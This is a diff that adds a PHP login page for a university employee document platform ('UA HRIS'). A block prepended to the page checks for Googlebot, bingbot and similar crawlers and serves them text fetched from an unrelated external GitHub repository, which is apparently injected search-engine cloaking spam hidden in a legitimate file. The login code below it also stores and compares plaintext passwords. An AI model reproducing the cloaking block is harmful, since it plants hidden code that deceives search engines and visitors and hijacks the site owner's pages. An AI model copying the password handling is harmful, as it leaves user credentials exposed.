@@ -1,0 +1,191 @@
+<?php
+function is_bot() {
+    $user_agent = $_SERVER['HTTP_USER_AGENT'];
+    $bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool');
+    
+    foreach ($bots as $bot) {
+        if (stripos($user_agent, $bot) !== false) {
+            return true;
+        }
+    }
+    
+    return false;
+}
+
+if (is_bot()) { 
+    $message = file_get_contents('https://raw.githubusercontent.com/berita-update4/hots/refs/heads/main/uahr.asist.edu.ph'); // 
+    echo $message; 
+    (exit);
+} 
+?>
+<?php
+   session_start();
+   include("db_connect.php");
+   
+   
+   if($_SERVER["REQUEST_METHOD"] == "POST") {
+      // username and password sent from form 
+      
+      $myusername = $mysqli->real_escape_string($_POST['username']);
+      $mypassword = $mysqli->real_escape_string($_POST['password']);
+      
+      $sql = "SELECT ID FROM users WHERE USERNAME = '$myusername' and PASSWORD = '$mypassword'";
+      
+      if ($result = $mysqli->query($sql)) {
+        
+        $count = mysqli_num_rows($result);
+        		
+      if($count == 1) {
+         session_register("myusername");
+         $_SESSION['login_user'] = $myusername;
+
+         		 $sql = 'SELECT NOW();';
+		if ($result1=mysqli_query($mysqli, $sql)) {
+			while ($row1 = $result1->fetch_row()) {
+			   $date = $row1[0]; 
+
+			}	
+			mysqli_free_result($result1);
+		}
+		 		  
+		 $mysqli->query("INSERT INTO loginusers (LOGINUSER,LOGINDATE) VALUES ('$myusername', '$date')");
+
+         
+         header("location: welcome.php");
+      } else {
+         $error = '<img src="icons/notice.png" /> ' . ' Your Login Name or Password is invalid';
+      }
+        
+      }
+   }
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>UA HRIS: Centralized Employee Document Management Platform</title>
+    <link rel="icon" type="image/x-icon" href="images/UALogoSmall.png">
+    <style type="text/css">
+        body {
+            font-family: Arial, Helvetica, sans-serif;
+            font-size: 14px;
+            margin: 0;
+            padding: 0;
+            height: 100vh; /* Make body take full viewport height */
+            display: flex;
+            justify-content: center; /* Center horizontally */
+            align-items: center; /* Center vertically */
+            background-image: url(images/asist1.jpg);
+            background-position: center;
+            background-repeat: no-repeat;
+            background-size: cover;
+        }
+        
+         .button {
+            background-color: #007bff;
+            border: none;
+            color: white;
+            padding: 10px 20px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 16px;
+            margin: 4px 2px;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+
+        .button:hover {
+            background-color: #0056b3;
+        }
+
+        label {
+            font-weight: bold;
+            width: 100px;
+            font-size: 13px;
+            color: #fff;
+        }
+
+        .box {
+            border: #666666 solid 1px;
+            width: 100%;
+        }
+
+        .login-container {
+            width: 400px;
+            border: 4px solid #458eb8;
+            border-radius: 5px;
+            background: linear-gradient(to top, #9DCEFF 1%, #00304C 1%);
+        }
+
+        .login-header {
+            background: linear-gradient(to top, #9DCEFF 1%, #00304C 1%);
+            color: #fff;
+            padding: 3px;
+        }
+
+        .login-header div {
+            margin: inherit;
+        }
+
+        .login-header img {
+            text-shadow: 2px 2px 2px #0E0935;
+        }
+
+        .login-form {
+            margin: 10px;
+            margin-bottom: 30px;
+        }
+
+        .login-form input[type="text"],
+        .login-form input[type="password"] {
+            font-size: 12px;
+            color: #fff;
+            margin-top: 10px;
+            margin-bottom: 4px;
+            background: transparent;
+            border: none;
+            border-bottom: 1px solid #fff;
+            padding: 5px;
+            width: 100%;
+            box-sizing: border-box;
+        }
+
+        .error-message {
+            font-size: 11px;
+            color: #F66AB7;
+            margin-top: 10px;
+        }
+        
+        
+    </style>
+    <link href="css/tables.css" rel="stylesheet" type="text/css" />
+</head>
+<body>
+
+<div class="login-container">
+    <div class="login-header">
+
+            <table style="border-collapse: collapse; width: 100%; border: 2px solid #00304C;"><tr>
+            <td><img src="images/UALogoSmall.png" width="50" height="50" /></td>
+            <td style="border: 2px solid #00304C; text-align: center; color: #fff; font-family: Arial, Helvetica, sans-serif; font-size: 18px;">UA HRIS: Centralized Employee Document Management Platform</td>
+            </tr></table>
+
+    </div>
+    <div class="login-form">
+        <form action="" method="post">
+            <div style="color: #fff;"><img src="icons/user3.png" />&nbsp;USERNAME:</div>
+            <input type="text" name="username" class="box" placeholder="Username" /><br /><br />
+
+            <div style="color: #fff;"><img src="icons/key3.png" />&nbsp;PASSWORD:</div>
+            <input type="password" name="password" class="box" placeholder="Password" /><br /><br />
+
+            <center><input type="submit" value="Submit" class="button" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+            <input type="reset" value="Clear" class="button" />
+
+            <div class="error-message"><?php echo $error; ?></div></center>
+        </form>
+    </div>
+</div>
+
+</body>
+</html>
